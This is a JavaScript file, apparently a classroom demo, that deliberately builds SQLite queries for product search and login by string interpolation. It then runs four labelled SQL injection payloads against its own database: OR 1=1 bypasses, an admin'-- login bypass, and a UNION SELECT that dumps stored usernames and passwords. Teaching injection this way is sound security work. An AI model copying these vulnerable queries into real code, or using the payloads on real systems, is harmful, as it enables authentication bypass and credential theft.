
// vulnerable.js - DO NOT USE THIS IN PRODUCTION!
// This is intentionally vulnerable to SQL injection

const Database = require('better-sqlite3');
const db = new Database('nyondo_stock.db');

// VULNERABLE: Using string concatenation/template literals
function searchProduct(name) {
    const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;
    console.log('\n[SEARCH] Query:', query);
    const rows = db.prepare(query).all();
    console.log('[SEARCH] Result:', rows);
    return rows;
}

// VULNERABLE: Using string concatenation/template literals
function login(username, password) {
    const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
    console.log('\n[LOGIN] Query:', query);
    const row = db.prepare(query).get();
    console.log('[LOGIN] Result:', row);
    return row;
}

console.log('\n========== ATTACK DEMONSTRATIONS ==========\n');

// ATTACK 1: Dump all products (bypass search)
console.log('\n--- ATTACK 1: Bypass search to see all products ---');
searchProduct("' OR 1=1--");

// ATTACK 2: Login as admin without password
console.log('\n--- ATTACK 2: Login as admin with any password ---');
login("admin'--", "anything");

// ATTACK 3: Always true login (returns first user)
console.log('\n--- ATTACK 3: Always true login ---');
login("' OR '1'='1", "' OR '1'='1");

// ATTACK 4: UNION attack - steal user credentials via search
console.log('\n--- ATTACK 4: UNION attack to steal user passwords ---');
searchProduct("' UNION SELECT id, username, password, role FROM users--");

db.close();